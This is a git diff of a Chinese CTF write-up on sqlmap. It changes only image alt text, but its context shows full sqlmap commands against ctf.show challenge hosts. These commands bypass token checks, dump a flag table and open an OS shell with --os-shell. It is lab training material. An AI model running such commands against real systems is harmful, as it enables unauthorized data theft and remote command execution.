@@ -369,7 +369,7 @@ Connection: close
 
 对`id`进行参数注入，`python sqlmap.py -r request.txt -p id`，还有就是代理到bp，看Ta发的包，参数为`--proxy="http://127.0.0.1:8080"`
 
-![1](./assets/001.jpg)
+![image](./assets/001.jpg)
 
 ## 例题
 
@@ -381,7 +381,7 @@ Connection: close
 python3 sqlmap.py -u "http://6c4586c9-e3cd-422d-81b4-edd84f668efb.challenge.ctf.show/api/?id=1" --user-agent=sqlmap --referer=ctf.show
 ```
 
-![1](./assets/002.jpg)
+![image](./assets/002.jpg)
 
 确认注入类型，然后就梭哈就完事了
 
@@ -459,7 +459,7 @@ python3 sqlmap.py -u "http://664e502c-af1a-4845-aae9-0cee9c9ba258.challenge.ctf.
 python3 sqlmap.py -u "http://f60f42ca-9e5f-4cbc-9f79-ce46c88cd952.challenge.ctf.show/api/index.php" --data="id=1"  --method=PUT --headers="Content-Type:text/plain" --safe-url="http://f60f42ca-9e5f-4cbc-9f79-ce46c88cd952.challenge.ctf.show/api/getToken.php" --safe-freq=1 --cookie="PHPSESSID=khfj7v9mah0p28b43l00da7674" --user-agent=sqlmap --referer=ctf.show -D ctfshow_web --tables
 ```
 
-![1](./assets/003.jpg)
+![image](./assets/003.jpg)
 
 但是如果把闭合写了
 
@@ -469,7 +469,7 @@ python3 sqlmap.py -u "http://f60f42ca-9e5f-4cbc-9f79-ce46c88cd952.challenge.ctf.
 
 他就不会盲注而是直接打出来，不过前提是要知道payload的样子
 
-![1](./assets/004.jpg)
+![image](./assets/004.jpg)
 
 ```shell
 python3 sqlmap.py -u "http://f60f42ca-9e5f-4cbc-9f79-ce46c88cd952.challenge.ctf.show/api/index.php" --data="id=1" --method=PUT --headers="Content-Type:text/plain" --safe-url="http://f60f42ca-9e5f-4cbc-9f79-ce46c88cd952.challenge.ctf.show/api/getToken.php" --safe-freq=1 --cookie="PHPSESSID=khfj7v9mah0p28b43l00da7674" --prefix="')" --suffix="#" --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_flaxc --columns --where="id=1" --dump --threads=5 --no-cast --time-sec=1 --charset="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}.ctfshow"
@@ -477,7 +477,7 @@ python3 sqlmap.py -u "http://f60f42ca-9e5f-4cbc-9f79-ce46c88cd952.challenge.ctf.
 
 优化一下参数，即使这样子可能注入出来的东西不完整，但是够快
 
-![1](./assets/005.jpg)
+![image](./assets/005.jpg)
 
 但是这样的命令跑不出来，线程加太大了，所以我又重新写了一下命令，用二分法和限制字符集，直接乱杀好吧
 
@@ -924,7 +924,7 @@ python3 sqlmap.py -u "http://dbae3790-fac5-4d70-948e-72d3aae610c6.challenge.ctf.
 python3 sqlmap.py -u "http://dbae3790-fac5-4d70-948e-72d3aae610c6.challenge.ctf.show/api/index.php" --user-agent=sqlmap --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type:text/plain" --cookie="PHPSESSID=tpp6v8rj8dr0jpglrfqu0db8a9" --safe-url="http://dbae3790-fac5-4d70-948e-72d3aae610c6.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper="ctfshowweb212" -D ctfshow_web --tables --batch --os-shell
 ```
 
-![1](./assets/006.jpg)
+![image](./assets/006.jpg)
 
 ## Tamper
 
